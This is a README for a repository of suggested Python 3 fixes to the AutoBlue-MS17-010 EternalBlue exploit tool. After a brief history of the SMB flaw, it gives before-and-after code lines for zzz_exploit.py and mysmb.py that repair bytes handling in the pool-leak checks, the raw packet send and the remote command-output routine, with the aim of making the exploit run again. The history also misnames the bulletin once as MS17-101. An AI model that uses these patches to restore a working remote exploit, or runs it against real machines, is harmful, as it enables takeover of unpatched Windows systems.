# AutoBlue MS17-010 Python 3 Fix

MS17-010 is a security flaw in Microsoft Windows operating systems that was discovered in March 2017. This vulnerability allows remote attackers to execute arbitrary code on a target system by sending specially crafted packets over the network. The EternalBlue exploit was developed by the U.S. National Security Agency (NSA) and leaked by the hacking group Shadow Brokers in April 2017. It takes advantage of the MS17-101 vulnerability, specifically the flaw in the Server Message Block (SMB) protocol, to remotely execute code on a target system, and potentially gaining full control over the system. EternalBlue gained notoriety for its usage in the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of computers worldwide. Microsoft released a patch to fix the vulnerability shortly after it was discovered.

This repo provides suggestions to fix the Python 3 version of the AutoBlue-MS17-010 Exploit Code, which is a tool that automates the EternalBlue exploit. The suggestions specifically address the issue related to `str` and `bytes` types in the `mysmb.py` and `zzz_exploit.py` Python scripts.

The original repository containing all the AutoBlue-MS17-010 exploit files can be accessed at: https://github.com/3ndG4me/AutoBlue-MS17-010

### The suggested changes for `zzz_exploit.py`:

- Use `bytes` instead of `str` on the if statement:
    ```python
    Original:
    321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
    ---
    Modified:
    321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
    ```

- Don't need to use `ord()` to convert `leakData` to Unicode:
    ```python
    Original:
    324        info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
    ---
    Modified:
    324        info['FRAG_POOL_SIZE'] = leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ] * X86_INFO['POOL_ALIGN']
    ```

- Use `bytes` instead of `str` on the if statement:
    ```python
    Original:
    325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
    ---
    Modified:
    325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
    ```

- Don't need to use `ord()` to convert `leakData` to Unicode:
    ```python
    Original:
    328        info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
    ---
    Modified:
    328        info['FRAG_POOL_SIZE'] = leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ] * X64_INFO['POOL_ALIGN']
    ```

- Use `bytes` instead of `str` to join the `reqs` elements:
    ```python
    Original:
    399        conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
    ---
    Modified:
    399        conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs))
    ```

- Use `bytes` instead of `str` on the if statement:
    ```python
    Original:
    418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
    ---
    Modified:
    418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != b'Frag':
    ```

- Use `bytes` instead of `str` on the if statement:
    ```python
    Original:
    429        if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
    ---
    Modified:
    429        if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
    ```

### The suggested changes for `mysmb.py`:

- Don't need to import `smbserver`, just remove it:
    ```python
    Original:
    3          from impacket import smb, smbconnection, smbserver
    ---
    Modified:
    3          from impacket import smb, smbconnection
    ```

- Don't need to import `ConfigParser`, just remove it:
    ```python
    Original:
    9          try:
    10             import ConfigParser
    11         except ImportError:
    12             import configparser as ConfigParser
    ```

- Don't need to define the values below, just remove it:
    ```python
    Original:
    17         SMBSERVER_DIR   = '__tmp'
    18         DUMMY_SHARE     = 'TMP'
    ```

- Verify if `data` need to be converted to `bytes`:
    ```python
    Original:
    89         transData += (b'\x00' * padLen) + str.encode(data)
    ---
    Modified:
    83         if (type(data) == bytes):
    84             transData += (b'\x00' * padLen) + data
    85         else:
    86             transData += (b'\x00' * padLen) + data.encode('utf-8')
    ```

- Substitute `%COMPUTERNAME%` by localhost address `127.0.0.1`:
    ```python
    Original:
    420        self.__output = '\\\\%COMPUTERNAME%\\{}\\{}'.format(self.__share,self.__outputFilename)
    ---
    Modified:
    417        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
    ```

- Remove `errors='replace'` inside `decode()`:
    ```python
    Original:
    483        self.prompt = self.__outputBuffer.decode(errors='replace').replace('\r\n','') + '>'
    ---
    Modified:
    489        self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
    ```

- Don't need to convert `fd.read()` to `bytes`:
    ```python
    Original:
    502        output_callback(fd.read().encode('utf-8'))
    ---
    Modified:
    499        output_callback(fd.read())
    ```

- Remove `errors='replace'` inside `decode()`:
    ```python
    Original:
    528        print(self.__outputBuffer.decode(errors='replace'))
    ---
    Modified:
    525        print(self.__outputBuffer.decode())
    ```

- Remove third argument in `smbConfig.set()`:
    ```python
    Original:
    566        smbConfig.set('IPC$','path','')
    ---
    Modified:
    563        smbConfig.set('IPC$','path')
    ```
